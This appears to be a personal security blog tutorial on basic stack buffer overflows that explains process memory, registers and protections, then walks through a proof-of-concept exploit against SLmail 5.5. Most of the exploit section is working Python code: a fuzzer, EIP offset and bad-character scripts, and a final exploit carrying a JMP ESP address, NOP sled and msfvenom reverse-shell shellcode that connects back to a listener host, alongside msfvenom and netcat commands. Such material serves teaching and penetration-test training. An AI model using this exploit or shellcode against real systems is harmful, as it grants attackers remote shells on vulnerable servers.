---
layout: post
title:  "Basic Buffer Overflow"
categories: "Windows Linux"
tags:  buffer overflow
author: Trelis
---

* content
{:toc}

# Introduction

## Process Memory
When an application is stared in a Win32 environment, a process is created and virtual memory is assigned to. In a 32 bit process, the address ranges from 0x00000000 to 0xFFFFFFFF, where 0x00000000 to 0x7FFFFFFF is assigned to "user-land", and 0x80000000 to 0xFFFFFFFF is assigned to "kernel land".[More information](https://www.bottomupcs.com/elements_of_a_process.xhtml)

### Stack
A stack is generic data structure that works exactly like a stack of plates; you can push an item (put a plate on top of a stack of plates), which then becomes the top item, or you can pop an item.
Stacks are fundamental to function calls. Each time a function is called it gets a new stack frame. This is an area of memory which usually contains, at a minimum, the address to return to when complete, the input arguments to the function and space for local variables.

By convention, stacks usually grow down. This means that the stack starts at a high address in memory and progressively gets lower.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/stack.png)

### Heap
The heap is an area of memory that is managed by the process for on the fly memory allocation. This is for variables whose memory requirements are not known at compile time.

### Text
The Text region contains the Program Code (basically instructions) of the executable or the process which will be executed. The Text area is marked as read-only and writing any data to this area will result into Segmentation Violation (Memory Protection Mechanism).

### Data
The Data region consists of the variables which are declared inside the program. This area has both initialized (data defined while coding) and uninitialized (data declared while coding) data. Static variables are stored in this section.


## Registers
These are the most important registers:
* **%EIP**: instruction pointer register. It stores the address of the next instruction to be executed, so it controlls the flows of the program.
* **%ESP**: stack pointer register. it stores the address of the top of the stack, so it points to the last element of the stack. 
* **%EBP**: base pinter register. It is designed to point to the current function so that all teh parameters and local variables would be in a fixed position, even though the %ESP register is moving. 
So the return address will be at %EBP+4, the first parameter at %EBP+8 and the first local variable at %EBP-4.
* **EAX**: accumulator, used for performing calculations, and used to store return values from function calls. Basic operations such as add, subtract, compare use this general-purpose register
* **EBX**: base (does not have anything to do with base pointer). It has no general purpose and can be used to store data.
* **ECX**: counter, used for iterations. ECX counts downward.
* **EDX**: data, this is an extension of the EAX register. It allows for more complex calculations (multiply, divide) by allowing extra data to be stored to facilitate those calculations. 
* **ESI**: source index, holds location of input data
* **EDI**: destination index, points to location of where result of data operation is stored 

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/register.png)

Data is stored in the registers using "Little Endian", right to letf: value 0x12345678 is stored like "\x78\x56\x34\x12"

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/little_endian.png)

## Example
Taking as an example the following code:
```python
void func(int a, int b, int c){
	int x = a + 2;
	int y = b + 10;
	return x + y + c;
}
int main() {
	func(10,50,60);
}
```

Initialy we have an empty stack.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/1.png)

1.	%EIP pointing at func in the main(). Saving the paramaters in inverse order.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/2.png)

2.	Saving the return address (the value of %EIP) in order to know which instruction will be the next to execute after exiting the function func().

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/4.png)

3.	%EIP now points at func() and %EBP is saved in order to restore the state after the function func() is executed.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/5.png)

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/6.png)

5.	%EBP = %ESP

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/8.png)

6.	Saving the local variables.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/10.png)

7.	Now the func() code can execute. %EIP will point each line of code.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/11.png)

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/12.png)

8.	After the execution, local variables are popped and moves %ESP back to where %EBP is.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/13.png)

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/14.png)

9.	%EBP is popped so its state can restored to the previous state before entering to func().

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/16.png)

10. %EIP is popped so its state can restored to the previous state before entering to func().

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/18.png)

11. Parameters sent to the funcion func() are popped.




# Buffer Overflow
## Introduction
A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. In this case, a buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. Writing outside the bounds of a block of allocated memory can corrupt data, crash the program, or cause the execution of malicious code.


## Vulnerable functions
The most common reason why buffer overflow attacks work is because applications fail to manage memory allocations and validate input from the client or other processes. Applications developed in C or C++ should avoid dangerous standard library functions that are not bounds checked and instead use libraries or classes explicitly created to perform string and other memory operations securely.
* gets() -> fgets() - read characters
* strcpy() -> strncpy() - copy content of the buffer
* strcat() -> strncat() - buffer concatenation
* sprintf() -> snprintf() - fill buffer with data of different types
* (f)scanf() - read from STDIN
* getwd() - return working directory
* realpath() - return absolute (full) path


## Example
1. It is expected to be stored 8 characters.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack1.png)

2. 8 'A's are correctly stored

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack2.png)

3. Howeever, if insted of 8 'A's, 12 are stored, EBP value will be overwrited.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack3.png)

4. If 16 'A' are stored, the register EIP will be overwrited. If an attacker is able to store malicious code in the memory where EIP is pointing, he will be able to execute it.

![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack4.png)


## Protections
* **ASLR** (Address Space Layout Randomization): It works by randomizing the positions of key data areas, usually including the base of the executable and position of libraries, heap, and stack, randomly in a process' address space. 
Randomization of the virtual memory addresses at which functions and variables can be found can make exploitation of a buffer overflow more difficult, but not impossible. 
* **DEP** (Data Execution Prevention): prevents an application from executing code in a non-executable area of memory. 
* **Stack Cookies**: (also known as "canary") are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately. It does not prevent the return address from being overwritten, but it increases the chances that the code notices the overwrite before fatefully following the overwritten return address.


## Proof of Concept
In order to show a practicle buffer overflow example, SLmail v5.5 will be used. It has a known vulnerability which can be found in [exploit-db][https://www.exploit-db.com/exploits/638]. 

1. Crash the application by sending 'A's.

fuzzing.py
```python
#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and increment by 200 in order to attempt to crash SLmail.

buff=["A"]

# Maximum size of buffer.

max_buffer = 4000

# Initial counter value.

counter = 100

# Value to increment per attempt.

increment = 200


while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash SLmail at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1023)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
     except: 
        print "[+] Connection failed. Make sure IP/port are correct, or check debugger for SLmail crash."
        sys.exit()
```

Then, calculate how many bytes are needed to make the software crash (NUM_BYTES):
[]

2. Identify with 4 bytes overwrite EIP
Create a unique pattern using pattner_create.rb:
```python
pattern_create.rb -l NUM_BYTES
```
[]


indentify_eip.py
```python
#!/usr/bin/python
import time, struct, sys
import socket as so

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:   
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + pattern + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()

```


Calculate the exact bytes which overwrite EIP using pattern_offset.rb:
```
pattern_offset.rb -q EIP_VALUE
```
[]


3. Check if we have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's
check_eip.py
```python
#!/usr/bin/python

import time, struct, sys
import socket as so

offset = 2606
bufferz = "A" * offset + "B" * 4 + "C" * 90

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + bufferz + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
```

4. Find space for the shellcode


5. Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00)
badchars.py
```python
#!/usr/bin/python

import time, struct, sys
import socket as so

baddies=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

badchars = ('\x00')

offset = 2606
buffer = "A" * offset + "B" * 4 + filter(lambda x: x not in badchars, baddies)

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:   
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()

```

6. Find the return address
Calculate op code of jmp esp using nasm_shell.rb:
```
nasm_shell.rb jmp esp
```

Search for a dll which has the values "rebase", "safeSEH", "ASLR" and "NXCompact" set to false:
```
!mona modules
```

Look for a "jmp esp" inside the dll:
```
!mona find -s "OP_CODE" -m "DLL_NAME.dll"

Select any pointer and copy its address

7. Create a shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"

8. Exploit
```python
#!/usr/bin/python
# coding=utf-8

import time, struct, sys
import socket as so

achars = 'A'*2606

#JMP ESP address is 5F4A358F
jmpesp = '\x8f\x35\x4a\x5f'

#NOP Sled
nops = '\x90'*16

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.132.7 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT
buf =  ""
buf += "\xdb\xdc\xd9\x74\x24\xf4\xbf\xf7\x90\xbb\x27\x5d\x2b"
buf += "\xc9\xb1\x52\x31\x7d\x17\x83\xc5\x04\x03\x8a\x83\x59"
buf += "\xd2\x88\x4c\x1f\x1d\x70\x8d\x40\x97\x95\xbc\x40\xc3"
buf += "\xde\xef\x70\x87\xb2\x03\xfa\xc5\x26\x97\x8e\xc1\x49"
buf += "\x10\x24\x34\x64\xa1\x15\x04\xe7\x21\x64\x59\xc7\x18"
buf += "\xa7\xac\x06\x5c\xda\x5d\x5a\x35\x90\xf0\x4a\x32\xec"
buf += "\xc8\xe1\x08\xe0\x48\x16\xd8\x03\x78\x89\x52\x5a\x5a"
buf += "\x28\xb6\xd6\xd3\x32\xdb\xd3\xaa\xc9\x2f\xaf\x2c\x1b"
buf += "\x7e\x50\x82\x62\x4e\xa3\xda\xa3\x69\x5c\xa9\xdd\x89"
buf += "\xe1\xaa\x1a\xf3\x3d\x3e\xb8\x53\xb5\x98\x64\x65\x1a"
buf += "\x7e\xef\x69\xd7\xf4\xb7\x6d\xe6\xd9\xcc\x8a\x63\xdc"
buf += "\x02\x1b\x37\xfb\x86\x47\xe3\x62\x9f\x2d\x42\x9a\xff"
buf += "\x8d\x3b\x3e\x74\x23\x2f\x33\xd7\x2c\x9c\x7e\xe7\xac"
buf += "\x8a\x09\x94\x9e\x15\xa2\x32\x93\xde\x6c\xc5\xd4\xf4"
buf += "\xc9\x59\x2b\xf7\x29\x70\xe8\xa3\x79\xea\xd9\xcb\x11"
buf += "\xea\xe6\x19\xb5\xba\x48\xf2\x76\x6a\x29\xa2\x1e\x60"
buf += "\xa6\x9d\x3f\x8b\x6c\xb6\xaa\x76\xe7\x79\x82\x3e\x77"
buf += "\x11\xd1\xbe\x66\xbe\x5c\x58\xe2\x2e\x09\xf3\x9b\xd7"
buf += "\x10\x8f\x3a\x17\x8f\xea\x7d\x93\x3c\x0b\x33\x54\x48"
buf += "\x1f\xa4\x94\x07\x7d\x63\xaa\xbd\xe9\xef\x39\x5a\xe9"
buf += "\x66\x22\xf5\xbe\x2f\x94\x0c\x2a\xc2\x8f\xa6\x48\x1f"
buf += "\x49\x80\xc8\xc4\xaa\x0f\xd1\x89\x97\x2b\xc1\x57\x17"
buf += "\x70\xb5\x07\x4e\x2e\x63\xee\x38\x80\xdd\xb8\x97\x4a"
buf += "\x89\x3d\xd4\x4c\xcf\x41\x31\x3b\x2f\xf3\xec\x7a\x50"
buf += "\x3c\x79\x8b\x29\x20\x19\x74\xe0\xe0\x29\x3f\xa8\x41"
buf += "\xa2\xe6\x39\xd0\xaf\x18\x94\x17\xd6\x9a\x1c\xe8\x2d"
buf += "\x82\x55\xed\x6a\x04\x86\x9f\xe3\xe1\xa8\x0c\x03\x20"

overflow = achars + jmpesp + nops + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   print "Make sure to use netcat first. Example: nc -nlvp 443"
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER jesse' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + overflow + '\r\n')
   print "\n[+] Completed. Check netcat for shell."
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()

```